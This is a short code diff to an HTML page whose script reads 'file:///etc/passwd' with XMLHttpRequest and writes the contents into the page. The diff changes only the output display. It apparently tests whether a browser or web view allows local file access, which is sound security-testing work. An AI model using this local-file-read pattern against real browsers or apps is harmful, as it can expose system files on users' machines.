@@ -9,8 +9,9 @@ var x = new XMLHttpRequest();
 x.open("GET", "file:///etc/passwd", false);
 x.overrideMimeType("text/plain; charset=UTF-8");
 x.send();
-document.getElementById('response').innerHTML = "Response: "+ x.statusText + " \n\n" + x.responseText;
-  
+var d = document.getElementById('response');
+d.innerHTML = "Loaded.\n\n";
+d.innerHTML = d.innerHTML + "Response: " + x.statusText + " \n\n" + x.responseText;
 </script>
 </body>
 </html>
